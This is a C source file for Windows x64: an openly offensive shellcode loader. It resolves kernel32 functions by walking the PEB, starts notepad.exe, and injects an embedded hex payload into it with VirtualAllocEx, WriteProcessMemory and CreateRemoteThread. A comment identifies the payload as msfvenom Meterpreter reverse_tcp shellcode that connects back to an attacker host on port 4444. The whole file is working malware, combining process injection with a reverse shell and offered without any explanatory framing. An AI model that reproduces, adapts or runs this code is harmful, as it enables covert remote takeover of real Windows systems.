#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <wchar.h>
#include <windows.h>
#include <winternl.h>

// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=`tun0` LPORT=4444 -f hex
#define SHELLCODE_HEX "fc4883e4f0e8cc000000415141505251564831d265488b5260488b5218488b5220480fb74a4a488b72504d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed52488b52208b423c41514801d0668178180b020f85720000008b80880000004885c074674801d050448b40208b48184901d0e3564d31c948ffc9418b34884801d64831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200115cc0a82da841544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a0a415e50504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd585c0740a49ffce75e5e8930000004883ec104889e24d31c96a0441584889f941ba02d9c85fffd583f8007e554883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd583f8007d2858415759680040000041586a005a41ba0b2f0f30ffd5575941ba756e4d61ffd549ffcee93cffffff4801c34829c64885f675b441ffe7586a005949c7c2f0b5a256ffd5"

#ifdef ENABLE_DEBUG
__attribute__((format(printf, 3, 4)))
static inline void log_func(const char *func, int line, const char *fmt, ...) {
  printf("[+] [%s:%d] ", func, line);
  va_list args;
  va_start(args, fmt);
  vprintf(fmt, args);
  va_end(args);
  printf("\n");
}
#define LOG(...) log_func(__func__, __LINE__, __VA_ARGS__)
#else
#define LOG(...) ((void)0)
#endif

#define FUNC __attribute__((section(".func")))

#define ALIGN_STACK()                                                          \
  __asm__ __volatile__(                                                        \
      "mov %%rsp, %%rax;" /* Move stack pointer to rax */                      \
      "and $0xF, %%rax;"  /* Check if aligned to 16 bytes */                   \
      "jz aligned;"       /* If aligned, jump to aligned If not aligned,       \
                             adjust the stack pointer */                       \
      "sub $8, %%rsp;"    /* Decrease stack pointer by 8 bytes */              \
      "xor %0, %0;"       /* Optionally zero out the allocated space */        \
      "aligned:"                                                               \
      :        /* No output operands */                                        \
      : "r"(0) /* Input operand (to zero out) */                               \
      : "%rax" /* Clobbered register */                                        \
  );

// typedef UINT(WINAPI *WinExecPtr)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef HMODULE(WINAPI *LoadLibraryA_t)(IN LPCSTR lpLibFileName);
typedef FARPROC(WINAPI *GetProcAddress_t)(IN HMODULE hModule, IN LPCSTR lpProcName);


FUNC int my_wcscmp(const wchar_t *s1, const wchar_t *s2) {
  while (*s1 != L'\0' && *s2 != L'\0') {
    if (*s1 != *s2) {
      return (*s1 < *s2) ? -1 : 1;
    }

    s1++;
    s2++;
  }

  if (*s1 == L'\0' && *s2 == L'\0') {
    return 0;
  }

  return (*s1 == L'\0') ? -1 : 1;
}

FUNC int my_strcmp(const char *str1, const char *str2) {
  while (*str1 != '\0' && *str2 != '\0') {
    if (*str1 != *str2) {
      return (*str1 < *str2) ? -1 : 1;
    }
    str1++;
    str2++;
  }

  if (*str1 == '\0' && *str2 == '\0') {
    return 0;
  }

  return (*str1 == '\0') ? -1 : 1;
}

FUNC PLDR_DATA_TABLE_ENTRY GetDllLdr(PPEB_LDR_DATA ldr, wchar_t *name) {
  PLIST_ENTRY item = ldr->InMemoryOrderModuleList.Blink;
  PLDR_DATA_TABLE_ENTRY dll = NULL;

  do {
    dll = CONTAINING_RECORD(item, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

    if (my_wcscmp(dll->FullDllName.Buffer, name) == 0) {
      return dll;
    }

    item = item->Blink;
  } while (item != NULL);

  return NULL;
}

FUNC PPEB GetPEB(void) {
  uint64_t value = 0;

  // Inline assembly to read from the GS segment
  asm volatile("movq %%gs:%1, %0"
               : "=r"(value)            // output
               : "m"(*(uint64_t *)0x60) // input
               :                        // no clobbered registers
  );

  return (PPEB)value;
}

FUNC void FindFunc(PVOID library_base, const char *name, void **func_ptr) {
  // Get PE headers
  PVOID pe_hdrs = (PVOID)(library_base + ((PIMAGE_DOS_HEADER)library_base)->e_lfanew);

  // Get Export Address Table RVA
  DWORD eat_rva = *(PDWORD)(pe_hdrs + 0x88);

  // Get address of Export Address Table
  PIMAGE_EXPORT_DIRECTORY eat = (PIMAGE_EXPORT_DIRECTORY)(library_base + eat_rva);

  // Get address of function names table
  PDWORD name_rva = (PDWORD)(library_base + eat->AddressOfNames);

  // Loop over imports
  int found_offset = -1;
  for (int i = 0; i < (int)eat->NumberOfNames; i++) {
    char *tmp = (char *)(library_base + name_rva[i]);
    if (my_strcmp(tmp, name) == 0) {
      found_offset = i;
    }
  }
  if (found_offset == -1) {
    *(int*)0 = 0; // crash :)
  }

  // Get function ordinal
  PWORD ordinals = (PWORD)(library_base + eat->AddressOfNameOrdinals);
  WORD ordinal = ordinals[found_offset];

  // Get function pointer
  PDWORD func_rvas = (PDWORD)(library_base + eat->AddressOfFunctions);
  DWORD func_rva = func_rvas[ordinal];
  *func_ptr = (library_base + func_rva);
}


FUNC int hex_char_to_int(char c) {
    if ('0' <= c && c <= '9') return c - '0';
    if ('a' <= c && c <= 'f') return 10 + (c - 'a');
    if ('A' <= c && c <= 'F') return 10 + (c - 'A');
    return -1;  // Invalid hex char
}


FUNC void get_shellcode(uint8_t *buf, size_t *bufsize) {
  const char shellcode_hex[] = SHELLCODE_HEX;
  
  *bufsize = (sizeof(shellcode_hex) - 1) / 2;
  if (buf != NULL) {
    for (size_t i = 0; i < *bufsize; i++) {
      int hi = hex_char_to_int(shellcode_hex[i*2]);
      int lo = hex_char_to_int(shellcode_hex[i*2+1]);
      if (hi == -1 || lo == -1) {
        LOG("failed to decode hex");
        return;
      }
      buf[i] = (hi << 4) | lo;
    }
  }
}


FUNC void run(typeof(LoadLibraryA) *LoadLibraryA, typeof(GetProcAddress) *GetProcAddress) {
  // Helpers to load all other libraries
  #define IMPORT_LIB(library) \
    /*LOG("Locating lib "#library);*/ \
    HANDLE library = LoadLibraryA(#library".dll"); \
    LOG("Located "#library" @ %p", library)
  #define IMPORT_FUNC(library, func) \
    /*LOG("Importing "#library"->"#func);*/ \
    typeof(func) *func = (typeof(func))(PVOID)GetProcAddress(library, #func); \
    LOG("Imported "#library"->"#func" @ %p", func)

  // Import everything
  IMPORT_LIB(kernel32);
  IMPORT_FUNC(kernel32, CreateProcessA);
  IMPORT_FUNC(kernel32, Sleep);
  IMPORT_FUNC(kernel32, HeapAlloc);
  IMPORT_FUNC(kernel32, GetProcessHeap);
  IMPORT_FUNC(kernel32, OpenProcess);
  IMPORT_FUNC(kernel32, VirtualAllocEx);
  IMPORT_FUNC(kernel32, WriteProcessMemory);
  IMPORT_FUNC(kernel32, CreateRemoteThread);
  
  LOG("Creating process...");
  STARTUPINFOA si = {0};
  si.cb = sizeof(si);
  PROCESS_INFORMATION pi = {0};
  if (!CreateProcessA(
    NULL,                // Application name
    "notepad.exe",       // Command line
    NULL,                // Process handle not inheritable
    NULL,                // Thread handle not inheritable
    FALSE,               // Set handle inheritance to FALSE
    0,                   // No creation flags
    NULL,                // Use parent's environment block
    NULL,                // Use parent's starting directory 
    &si,                 // Pointer to STARTUPINFO structure
    &pi                  // Pointer to PROCESS_INFORMATION structure
  )) {
    LOG("Created process failed :(");
    return;
  }
  LOG("pid is %ld", pi.dwProcessId);

  LOG("Sleeping...");
  Sleep(3000);
  
  LOG("Decoding shellcode");
  size_t shellcode_bufsize = 0;
  get_shellcode(NULL, &shellcode_bufsize);
  uint8_t *shellcode_buf = HeapAlloc(GetProcessHeap(), 0, shellcode_bufsize);
  if (shellcode_buf == NULL) {
    LOG("HeapAlloc failed");
    return;
  }
  get_shellcode(shellcode_buf, &shellcode_bufsize);
  LOG("Decoded %I64d shellcode bytes", shellcode_bufsize);
  LOG("Shellcode = [%02x,%02x,%02x ... %02x,%02x,%02x]", shellcode_buf[0], shellcode_buf[1], shellcode_buf[2], shellcode_buf[shellcode_bufsize-3], shellcode_buf[shellcode_bufsize-2], shellcode_buf[shellcode_bufsize-1]);


  LOG("Opening process...");
  HANDLE hProcess = OpenProcess(
    PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
    FALSE,
    pi.dwProcessId);
  if (!hProcess) {
    LOG("OpenProcess failed");
    return;
  }

  LOG("VirtualAllocEx'ing mem");
  LPVOID remote_buf = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (remote_buf == NULL) {
    LOG("VirtualAllocEx failed :(");
    return;
  }

  LOG("Writing shellcode to remote");
  size_t num_bytes_written = 0;
  if (!WriteProcessMemory(hProcess, remote_buf, shellcode_buf, shellcode_bufsize, &num_bytes_written)) {
    LOG("WriteProcessMemory failed :(");
    return;
  }
  LOG("Wrote %I64d bytes to remote", num_bytes_written);


  LOG("Creating remote thread");
  if (!CreateRemoteThread(hProcess, NULL, 0, remote_buf, NULL, 0, NULL)) {
    LOG("CreateRemoteThread failed :(");
    return;
  }
}


#ifdef ENABLE_DEBUG
int main() {
#else
int start(void) {
#endif
  PPEB peb = GetPEB();

  wchar_t dll_name[] = L"C:\\Windows\\System32\\KERNEL32.DLL";

  // Get address of kernel32.dll
  PLDR_DATA_TABLE_ENTRY kernel32_ldr = GetDllLdr(peb->Ldr, dll_name);
  PVOID kernel32 = kernel32_ldr->DllBase;

  // Now we have kernel32 - we can find the functions that we need to load other libs
  #define LOCATE_KERNEL32_FUNC(func) \
    typeof(func) *func = NULL; \
    FindFunc(kernel32, #func, (void**)&func);
  LOCATE_KERNEL32_FUNC(LoadLibraryA)
  LOCATE_KERNEL32_FUNC(GetProcAddress)

  // Call sub code
  run(LoadLibraryA, GetProcAddress);
  return 0;
}